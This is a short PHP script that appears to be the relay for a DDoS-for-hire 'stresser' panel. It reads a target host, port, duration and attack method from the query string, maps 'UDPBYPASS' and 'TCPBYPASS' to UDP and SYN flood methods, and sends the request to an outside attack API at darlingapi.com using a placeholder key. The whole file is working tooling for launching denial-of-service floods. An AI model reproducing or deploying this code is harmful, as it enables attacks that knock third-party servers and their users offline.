<?php

//Fields
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];

//Layer 4 Methods
if ($method == "UDPBYPASS") $method = "UDPBOT";
if ($method == "TCPBYPASS") $method = "SYNOPT";

//API Link
$Link = "https://darlingapi.com/?key=YOURAPIKEY&host=$host&port=$port&time=$time&method=$method";

try 
{  
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $Link);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	$result = curl_exec($ch);
	curl_close($ch);
}

catch(Exception $e)
{
 	die("Something went wrong. Please contact an administrator!");
}

echo $result;

?>
